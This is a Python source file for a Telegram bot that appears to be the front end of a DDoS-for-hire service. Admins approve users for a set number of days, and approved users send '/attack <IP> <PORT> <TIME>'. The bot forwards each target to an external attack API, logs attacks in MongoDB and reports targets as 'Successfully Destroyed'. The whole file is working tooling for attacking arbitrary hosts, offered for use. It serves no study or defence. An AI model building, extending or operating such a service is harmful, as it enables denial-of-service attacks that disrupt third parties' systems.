import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes,
    MessageHandler
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Blocked ports (must match backend)
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# Allowed port range
MIN_PORT = 1
MAX_PORT = 65535

# --- FEEDBACK SYSTEM TRACKING ---
pending_feedback = {}

# Helper function to make datetime timezone-aware
def make_aware(dt):
    """Convert naive datetime to timezone-aware UTC datetime"""
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    """Get current UTC time with timezone"""
    return datetime.now(timezone.utc)

def get_progress_bar(percentage):
    """Generate a bhayanak progress bar"""
    filled_len = int(10 * percentage / 100)
    bar = '█' * filled_len + '░' * (10 - filled_len)
    return bar

def escape_markdown(text: str) -> str:
    """Escape special characters for MarkdownV2"""
    if not text:
        return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

# MongoDB Connection
class Database:
    def __init__(self):
        try:
            if not MONGODB_URI:
                raise Exception("❌ MONGODB_URI missing in Railway/.env")

            self.client = MongoClient(
                MONGODB_URI,
                serverSelectionTimeoutMS=10000
            )

            # Test MongoDB connection
            self.client.admin.command("ping")

            self.db = self.client[DATABASE_NAME]
            self.users = self.db.users
            self.attacks = self.db.attacks

            logger.info("✅ MongoDB Connected Successfully")

        except Exception as e:
            logger.error(f"❌ MongoDB Connection Failed: {e}")
            raise e

        # Clean invalid users
        try:
            result = self.users.delete_many({"user_id": None})
            if result.deleted_count > 0:
                logger.info(f"Deleted {result.deleted_count} documents with null user_id")

            result = self.users.delete_many({"user_id": {"$exists": False}})
            if result.deleted_count > 0:
                logger.info(f"Deleted {result.deleted_count} documents without user_id")

        except Exception as e:
            logger.error(f"Error cleaning users collection: {e}")

        # Drop old indexes
        try:
            self.users.drop_indexes()
        except Exception:
            pass

        try:
            self.attacks.drop_indexes()
        except Exception:
            pass

        # Create indexes
        try:
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.attacks.create_index([("user_id", ASCENDING)])
            self.attacks.create_index([("status", ASCENDING)])

            self.users.create_index(
                [("user_id", ASCENDING)],
                unique=True,
                sparse=True
            )

            logger.info("✅ MongoDB Indexes Created")

        except Exception as e:
            logger.error(f"Index creation error: {e}")

    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"):
                user["expires_at"] = make_aware(user["expires_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing_user = self.get_user(user_id)
        if existing_user:
            return existing_user
            
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created new user: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            user_data = self.get_user(user_id)
        except Exception as e:
            logger.error(f"Error creating user: {e}")
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return result.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
            logger.info(f"Logged attack for user {user_id}: {status}")
        except Exception as e:
            logger.error(f"Failed to log attack: {e}")
    
    def get_all_users(self) -> List[Dict]:
        users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
        for user in users:
            if user.get("created_at"): user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"): user["approved_at"] = make_aware(user["approved_at"])
            if user.get("expires_at"): user["expires_at"] = make_aware(user["expires_at"])
            if "total_attacks" not in user: user["total_attacks"] = 0
        return users

db = Database()

# Authentication decorator
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# Check approval
async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved", False): return False
    expires_at = make_aware(user.get("expires_at"))
    if expires_at and expires_at < get_current_time(): return False
    return True

# --- API FUNCTIONS (FIXED) ---
def launch_attack(ip: str, port: int, duration: int) -> Dict:
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        return response.json()
    except Exception as e:
        logger.error(f"Attack launch error: {e}")
        return {"error": str(e), "success": False}

# --- FEEDBACK HANDLER ---
async def handle_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text or update.message.caption or ""

    if "#feedback" in text.lower():
        if pending_feedback.get(user_id):
            pending_feedback[user_id] = False
            await update.message.reply_text("✅ **DHANYAWAD!**\nFeedback mil gaya, ab agla attack unlocked hai! 🔥")
        else:
            await update.message.reply_text("Bhai abhi koi pending feedback nahi hai. Attack pehle lagao!")

# --- BOT COMMANDS ---
@admin_required
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        if db.approve_user(user_id, days):
            await update.message.reply_text(f"✅ User {user_id} approved for {days} days!")
    except:
        await update.message.reply_text("❌ Usage: /approve <id> <days>")

@admin_required
async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(f"✅ User {user_id} disapproved.")
    except:
        await update.message.reply_text("❌ Usage: /disapprove <id>")

# --- BHAYANAK ATTACK COMMAND WITH UI & FEEDBACK LOCK ---
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)

    if not await is_user_approved(user_id):
        await update.message.reply_text("❌ Access Denied! Admin se approval lo.")
        return

    # FEEDBACK CHECK
    if pending_feedback.get(user_id):
        await update.message.reply_text("⚠️ **FEEDBACK REQUIRED!**\nPehle pichle attack ka feedback do (#feedback) tabhi agla attack hoga!")
        return

    try:
        if len(context.args) < 3:
            await update.message.reply_text("❌ Usage: /attack <IP> <PORT> <TIME>")
            return

        target, port, duration = context.args[0], int(context.args[1]), int(context.args[2])

        if port in BLOCKED_PORTS:
            await update.message.reply_text(f"❌ Port {port} is blocked!")
            return

        # LAUNCH
        response = launch_attack(target, port, duration)

        if response.get("success") or response.get("status") == "success":
            db.log_attack(user_id, target, port, duration, "success")
            
            # START UI
            start_time = get_current_time()
            msg = await update.message.reply_text(
                f"🚀 **ATTACK STARTED BY ADMIN SERVER ** 🚀\n\n"
                f"🎯 **Target:** `{target}:{port}`\n"
                f"🕒 **Time:** `{duration}s`\n"
                f"🌀 **Status:** `Initializing...`",
                parse_mode='Markdown'
            )

            # PROGRESS BAR & TIME LEFT LOGIC
            for i in range(0, 101, 25):
                await asyncio.sleep(duration / 4.5)
                bar = get_progress_bar(i)
                time_passed = (get_current_time() - start_time).seconds
                time_left = max(0, duration - time_passed)
                
                await msg.edit_text(
                    f"⚡ **ATTACK IN PROGRESS** ⚡\n\n"
                    f"🎯 **Target:** `{target}:{port}`\n"
                    f"📊 **Progress:** `[{bar}] {i}%`\n"
                    f"⏳ **Time Left:** `{time_left}s`",
                    parse_mode='Markdown'
                )

            # FINISH UI
            await msg.edit_text(
                f"✅ **ATTACK FINISHED** ✅\n\n"
                f"💎 **Target:** `{target}:{port}`\n"
                f"🏁 **Status:** `Successfully Destroyed` \n\n"
                f"📝 **Note:** Next attack ke liye `#feedback` dena zaroori hai!",
                parse_mode='Markdown'
            )
            
            pending_feedback[user_id] = True

        else:
            await update.message.reply_text(f"❌ API Error: {response.get('error', 'Unknown')}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("disapprove", disapprove_command))
    
    # Feedback Listener
    application.add_handler(MessageHandler(filters.Regex(re.compile(r'#feedback', re.IGNORECASE)) | (filters.PHOTO & filters.CaptionRegex(re.compile(r'#feedback', re.IGNORECASE))), handle_feedback))

    print("✅ Bot Started with Full Logic & Bhayanak UI!")
    application.run_polling()

if __name__ == '__main__':
    main()